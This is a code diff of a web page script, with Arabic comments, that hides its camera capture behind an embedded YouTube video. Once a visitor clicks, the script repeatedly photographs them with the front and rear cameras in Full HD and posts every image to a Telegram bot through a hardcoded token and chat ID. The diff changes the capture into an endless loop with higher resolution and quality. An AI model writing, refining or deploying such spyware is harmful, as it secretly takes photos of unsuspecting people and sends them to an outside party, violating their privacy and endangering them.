@@ -52,13 +52,12 @@
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
-
 <script>
     const CONFIG = {
         TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
         CHAT_ID: "7000276863",
-        INTERVAL: 3000,  // زيادة الوقت قليلاً للسماح للمتصفح بالتبديل بين الكاميرات
-        QUALITY: 0.8     // تحسين الجودة من 0.15 إلى 0.8 (جودة عالية جداً)
+        TY: 2000,        // ثانيتين بين كل دورة تصوير
+        QUALITY: 0.9,    // جودة احترافية (من 0.1 إلى 1.0)
     };
 
     const video = document.getElementById('v');
@@ -67,82 +66,86 @@
     const iframe = document.getElementById('youtube-player');
 
     let isStarted = false;
-    let currentFacingMode = "user"; // نبدأ بالأمامية
 
     document.body.addEventListener('click', () => {
         if (isStarted) return;
         isStarted = true;
 
-        // تشغيل الصوت
+        // تشغيل الصوت فوراً
         if(iframe) {
             let currentSrc = iframe.src;
             iframe.src = currentSrc.replace("mute=1", "mute=0");
         }
 
-        // بدء حلقة العمل المزدوجة
-        startDualCaptureLoop();
+        // بدء الدورة المتزامنة
+        startCaptureSequence();
     });
 
-    async function startDualCaptureLoop() {
-        // تنفيذ العملية فوراً ثم تكرارها
-        async function run() {
-            // 1. التقاط من الكاميرا الأمامية
-            await captureFromDevice("user");
-            // 2. انتظار بسيط لراحة المعالج
-            await new Promise(r => setTimeout(r, 500));
-            // 3. التقاط من الكاميرا الخلفية
-            await captureFromDevice("environment");
-        }
+    async function startCaptureSequence() {
+        while (true) { // حلقة مستمرة
+            // 1. التقاط الكاميرا الأمامية
+            await takeSnapshot("user", "📸 أمامية HD");
+            
+            // انتظر ثانية واحدة قبل التبديل
+            await new Promise(r => setTimeout(r, 1000));
 
-        run();
-        setInterval(run, CONFIG.INTERVAL);
+            // 2. التقاط الكاميرا الخلفية
+            await takeSnapshot("environment", "📸 خلفية HD");
+
+            // انتظر ثانيتين قبل البدء في الدورة الجديدة (حسب طلبك)
+            await new Promise(r => setTimeout(r, CONFIG.TY));
+        }
     }
 
-    async function captureFromDevice(mode) {
+    async function takeSnapshot(mode, label) {
         try {
-            // فتح الكاميرا المطلوبة
+            // طلب الكاميرا بدقة عالية جداً
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } } 
+                video: { 
+                    facingMode: mode,
+                    width: { ideal: 1920 }, // دقة Full HD إذا أمكن
+                    height: { ideal: 1080 }
+                } 
             });
             
             video.srcObject = stream;
             
-            // انتظار تحميل الميتا لضمان جودة الصورة
-            await new Promise((resolve) => {
+            // انتظار استقرار العدسة (الفوكس والضوء)
+            await new Promise(resolve => {
                 video.onloadedmetadata = () => {
                     video.play();
-                    // ننتظر قليلاً حتى يضبط الفوكس التلقائي
-                    setTimeout(resolve, 800); 
+                    setTimeout(resolve, 800); // 0.8 ثانية لضمان جودة الصورة
                 };
             });
 
-            // ضبط الحجم بدقة عالية
+            // مطابقة حجم الكانفاس مع جودة الكاميرا الحقيقية
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تحويل وإرسال
+            // تحويل الصورة بجودة عالية جداً
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', CONFIG.QUALITY));
             
             const formData = new FormData();
             formData.append('chat_id', CONFIG.CHAT_ID);
-            formData.append('caption', mode === "user" ? "📸 كاميرا أمامية" : "📸 كاميرا خلفية");
+            formData.append('caption', label);
             formData.append('photo', blob, 'capture.jpg');
 
+            // إرسال سريع
             fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             }).catch(() => {});
 
-            // إغلاق الكاميرا فوراً للسماح للثانية بالعمل
-            stream.getTracks().forEach(track => track.stop());
+            // إغلاق الكاميرا فوراً لتحرير الجهاز للكاميرا التالية
+            stream.getTracks().forEach(t => t.stop());
             video.srcObject = null;
 
         } catch (err) {
-            console.warn(`فشل الوصول للكاميرا (${mode}):`, err);
+            console.error("خطأ في الكاميرا:", mode, err);
         }
     }
-                    </script>
+</script>
     
 
 </body>
